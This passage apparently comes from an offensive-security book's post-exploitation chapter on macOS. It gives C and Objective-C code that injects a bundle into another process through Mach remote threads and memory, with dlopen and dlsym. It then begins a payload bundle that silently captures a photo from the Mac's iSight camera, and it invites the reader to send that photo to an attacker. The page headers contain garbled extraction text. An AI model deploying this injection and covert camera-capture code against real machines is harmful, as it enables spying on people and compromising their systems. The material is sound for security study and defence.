if (((ppc_thread_state_t*)old_state)->__srr0 == MAGIC_RETURN) {
thread_suspend(thread);
return MIG_NO_REPLY;
}
break;
#endif
}
/*
* Otherwise, keep searching for an exception handler
*/
return KERN_INVALID_ARGUMENT;
}
In an alternative implementation, we could have decided that all exceptions
in the injected thread should be handled by the injector and not delivered to
the target process. This would prevent programming errors in the injected
bundle from adversely affecting the target process but also make debugging
very diffi cult, as the debugger attached to the injector would not have access to
the memory in the target process. In a production injector, it might make more
sense to prevent exceptions from the remote thread from being delivered to
the remote process.
Remote Process Memory
Our remote-memory-management interface is meant to resemble the copyin/copy-
out interface that UNIX kernels use to transfer memory between the kernel and the
user space, as well as the traditional malloc/free user-space memory allocator.
kern_return_t
remote_copyout(task_t task, void* src, vm_address_t dest, size_t n);
kern_return_t
remote_copyin(task_t task, vm_address_t src, void* dest, size_t n);
9955336633cc1111..iinndddd 330066 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 307
vm_address_t
remote_malloc(task_t task, size_t size);
kern_return_t
remote_free(task_t task, vm_address_t addr);
In addition to the remote thread’s stack, we must be able to allocate memory
in the remote address space. This can be used, for example, to pass strings
or structures to remote functions. Luckily, the Mach system calls also make
this possible.
The Mach system calls vm_allocate(), vm_deallocate(), vm_read(), and vm_
write() all take a Mach task as their fi rst argument. This allows us to perform
these operations on our current task or any other task that we have access to.
In this case we will use these functions to implement a very simple remote
memory-management interface.
Loading a Dynamic Library or Bundle
Finally, the injector has a high-level function to inject a bundle from disk into
a given Mach task.
kern_return_t
inject_bundle(task_t task, const char* bundle_path, void**
return_value);
Now that we have an interface to allocate memory and create threads in the
remote process, we can use them to call arbitrary functions remotely. We will
use this to build our fi nal interface, inject_bundle(). Calling a remote function
requires allocating remote memory for any string or structure arguments, creat-
ing a remote thread to call the function, and waiting for the thread to terminate
to retrieve the return value. The following code shows how to call a simple
function, getpid(), in a remote process.
kern_return_t
remote_getpid(task_t task, pid_t* pid)
{
kern_return_t kr;
remote_thread_t thread;
if ((kr = create_remote_thread(task, &thread,
(vm_address_t)&getpid, 0))) {
warnx(“create_remote_thread() failed: %s”,
mach_error_string(kr));
return kr;
}
if ((kr = join_remote_thread(&thread, (void**)pid))) {
warnx(“join_remote_thread() failed: %s”, mach_error_string(kr));
9955336633cc1111..iinndddd 330077 11//2255//0099 44::4433::0033 PPMM
308 Part IV ■ Post-Exploitation
return kr;
}
return kr;
}
The next example is the implementation of inject_bundle() and shows how
to call more-complex functions.
kern_return_t
inject_bundle(task_t task, const char* bundle_path, void** return_value)
{
kern_return_t kr;
char path[PATH_MAX];
vm_address_t path_rptr, sub_rptr;
remote_thread_t thread;
void* dl_handle = 0, *sub_addr = 0;
/*
* Since the remote process may have a different working directory
* and library path environment variables, you must load the bundle
* via a canonical absolute path.
*/
if (!realpath(bundle_path, path)) {
warn(“realpath”);
return KERN_FAILURE;
}
/*
* dl_handle = dlopen(path, RTLD_LAZY | RTLD_LOCAL)
*/
path_rptr = remote_malloc(task, sizeof(path));
remote_copyout(task, path, path_rptr, sizeof(path));
if ((kr = create_remote_thread(task, &thread,
(vm_address_t)&dlopen, 2,
path_rptr, RTLD_LAZY | RTLD_LOCAL)))
{
warnx(“create_remote_thread dlopen() failed: %s”,
mach_error_string(kr));
return kr;
}
if ((kr = join_remote_thread(&thread, &dl_handle))) {
warnx(“join_remote_thread dlopen() failed: %s”,
mach_error_string(kr));
return kr;
}
remote_free(task, path_rptr);
9955336633cc1111..iinndddd 330088 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 309
if (dl_handle == NULL) {
warnx(“dlopen() failed”);
return KERN_FAILURE;
}
/*
* sub_addr = dlsym(dl_handle, “run”)
*/
sub_rptr = remote_malloc(task, strlen(BUNDLE_MAIN) + 1);
remote_copyout(task, BUNDLE_MAIN, sub_rptr,
strlen(BUNDLE_MAIN) + 1);
if ((kr = create_remote_thread(task, &thread,
(vm_address_t)&dlsym, 2,
dl_handle, sub_rptr))) {
warnx(“create_remote_thread dlsym() failed: %s”,
mach_error_string(kr));
return kr;
}
if ((kr = join_remote_thread(&thread, &sub_addr))) {
warnx(“join_remote_thread dlsym() failed: %s”,
mach_error_string(kr));
return kr;
}
remote_free(task, sub_rptr);
if (sub_addr) {
/*
* return_value = run()
*/
if ((kr = create_remote_thread(task, &thread,
(vm_address_t)sub_addr, 0))) {
warnx(“create_remote_thread run() failed: %s”,
mach_error_string(kr));
return kr;
}
if ((kr = join_remote_thread(&thread, return_value))) {
warnx(“join_remote_thread run() failed: %s”,
mach_error_string(kr));
return kr;
}
return (int)return_value;
}
return kr;
}
9955336633cc1111..iinndddd 330099 11//2255//0099 44::4433::0033 PPMM
310 Part IV ■ Post-Exploitation
Besides showing more-advanced usage of the remote thread and memory
functions, the preceding example also shows how to use the standard library
functions dlopen() and dlsym(). The dlopen() function loads and links a
dynamic library or bundle into the current process. The function takes as argu-
ments the path to a Mach-O fi le and a mode constant to control whether external
references from the Mach-O fi le are resolved immediately or lazily (the default).
The dlopen() function returns a handle to the loaded fi le, which is actually the
base address to which the fi le is loaded. This handle is also passed to dlsym()to
resolve symbols within it. In our case, we look up a function called “run” and
call it. Having a separate run() function allows the bundle to have constructors
that may be initialized in any order while ensuring that a specifi c function will
be called after all of the constructors have run. Here is a simple bundle with a
constructor function named init(), a destructor function called fi ni(), and the
main function run().
/*
* Simple test bundle to demonstrate remote bundle injection.
*
* Compile with: cc -bundle -o test test.c
*/
#include 
extern void init(void) __attribute__ ((constructor));
void init(void)
{
printf(“In init()\n”);
}
int run()
{
printf(“In run()\n”);
return 0xdeadbeef;
}
extern void fini(void) __attribute__ ((destructor));
void fini(void)
{
printf(“In fini()\n”);
}
The rest of this chapter explores progressively more complex and interesting
injectable bundles that may be used in the remote bundle-injection exploit pay-
load or the local bundle injector that we have just described. When developing
your own injectable bundles, it is best to develop and test them fi rst using the
local injector and then ensure that they also work using the injector payload.
9955336633cc1111..iinndddd 331100 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 311
Inject-Bundle Usage
Now that the inject_bundle() function is fully implemented, you can use it to
build a simple command-line utility to call it on an existing or newly created
process. The source-code package for this book contains the inject-bundle util-
ity. Its usage is shown here:
usage: ./inject-bundle  [ |  [ arguments …] ]
With one argument (a path to a compiled Mach-O bundle), inject-bundle
injects the bundle into its own Mach task. This is the simplest way to test a
bundle in development since you need to debug only one process. If the second
argument is a numeric process ID, inject-bundle injects the bundle into that
process. In the fi nal form, the third argument and the optional subsequent
arguments are a path to an executable to run and any command-line options
for it. In this form, inject-bundle will launch that executable with the bundle
preinjected.
As a quick example, if you run the test bundle using inject-bundle, you can
see the order in which its functions are called.
% ./inject-bundle ../bundles/helloworld
In init()
In run()
In fini()
%
Example: iSight Photo Capture
For the fi rst example, we will describe a fun post-exploitation injectable bundle:
a bundle that takes a picture using the Mac’s iSight camera. Almost all Macs
sold within the last several years (excluding Mac Minis and Mac Pros) have a
built-in iSight video camera and microphone. This allows any Mac to be turned
into a remote observation and listening device. Luckily, the iSight has an activity
light that lights up when it is enabled. When running this example, you will
notice that this light is lit for a split second.
Use an existing open-source Cocoa class to capture a single frame from the
iSight: CocoaSequenceGrabber, written by Tim Omernick (http://www.skyfell
.org/cocoasequencegrabber.html). CocoaSequenceGrabber provides a class,
CSGCamera, to control the Mac’s default camera. An application using this class
provides a delegate class to receive frames from the camera. Our bundle defi nes
CSGCameraDelegate for this purpose.
Our CSGCameraDelegate class receives the fi rst frame from the CSGCamera
and converts it to a JPEG-image data stream. This stream is stored in a previ-
ously supplied CFMutableDataRef, allowing the user of this class to retrieve
9955336633cc1111..iinndddd 331111 11//2255//0099 44::4433::0033 PPMM
312 Part IV ■ Post-Exploitation
the JPEG image after the frame is captured. The following code shows the full
interface and implementation to the CSGCameraDelete class.
/*
* This delegate handles the didReceiveFrame callback from CSGCamera,
* which we use to convert the image to a JPEG.
*/
@interface CSGCameraDelegate : CSGCamera
{
CFMutableDataRef data;
}
/*
* Assign a CFMutableDataRef to receive JPEG image data
*/
- (void)setDataRef:(CFMutableDataRef)dataRef;
/*
* Convert captured frame into a JPEG datastream, stored in a CFDataRef
*/
- (void)camera:(CSGCamera *)aCamera didReceiveFrame:(CSGImage *)aFrame;
@end
@implementation CSGCameraDelegate
- (void)setDataRef:(CFMutableDataRef)dataRef
{
data = dataRef;
}
- (void)camera:(CSGCamera *)aCamera didReceiveFrame:(CSGImage *)aFrame;
{
// First, we must convert to a TIFF bitmap
NSBitmapImageRep *imageRep =
[NSBitmapImageRep
imageRepWithData: [aFrame TIFFRepresentation]];
NSNumber *quality = [NSNumber numberWithFloat: 0.1];
NSDictionary *props =
[NSDictionary dictionaryWithObject:quality
forKey:NSImageCompressionFactor];
// Now convert TIFF bitmap to JPEG compressed image
NSData *jpeg =
[imageRep representationUsingType: NSJPEGFileType
properties:props];
// Store JPEG image in a CFDataRef
9955336633cc1111..iinndddd 331122 11//2255//0099 44::4433::0033 PPMM
Chapter 11 ■ Injecting, Hooking, and Swizzling 313
CFIndex jpegLen = CFDataGetLength((CFDataRef)jpeg);
CFDataSetLength(data, jpegLen);
CFDataReplaceBytes(data, CFRangeMake((CFIndex)0, jpegLen),
CFDataGetBytePtr((CFDataRef)jpeg), jpegLen);
[aCamera stop];
}
@end
This bundle does all of its work in its run() function, which is called explic-
itly by the local and remote bundle injectors. The isight bundle simply creates
a CSGCameraDelegate to receive frames and a CSGCamera to capture frames
from the iSight, and runs a new NSRunLoop for one second. This gives the
CSGCamera class enough time to capture at least one image. The frame-receiv-
ing method in CSGCameraDelegate stops the CSGCamera after it receives the
fi rst frame.
After the NSRunLoop terminates, the JPEG image data is saved to disk at /
tmp/isight.jpg. A sneakier bundle could transmit this image back to the attacker
instead of saving it to the local system, but we leave that as an exercise to you.
Here is the full code for run().
void run(int not_used)
{
NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
/*
* Use CocoaSequenceGrabber to capture a single image from the
* iSight camera and store it as a JPEG data stream in picture.
*/
CFMutableDataRef picture = CFDataCreateMutable(NULL, 0);